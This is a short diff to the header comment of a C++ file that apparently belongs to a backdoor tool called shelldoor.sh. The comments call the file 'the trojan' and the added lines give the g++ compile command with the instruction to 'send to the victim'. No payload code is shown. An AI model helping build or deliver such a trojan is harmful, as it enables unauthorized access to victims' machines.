@@ -1,6 +1,9 @@
 // This script makes part of the shelldoor.sh.
 // This is the trojan.
-//
+// Use this script instead of shelldoor.sh -s; 
+// Compile it and send to the victim.
+// g++ buildMe.cpp -o <exe_file>
+// 
 // Mateus-n00b, February 2017
 //
 // Version 0.1
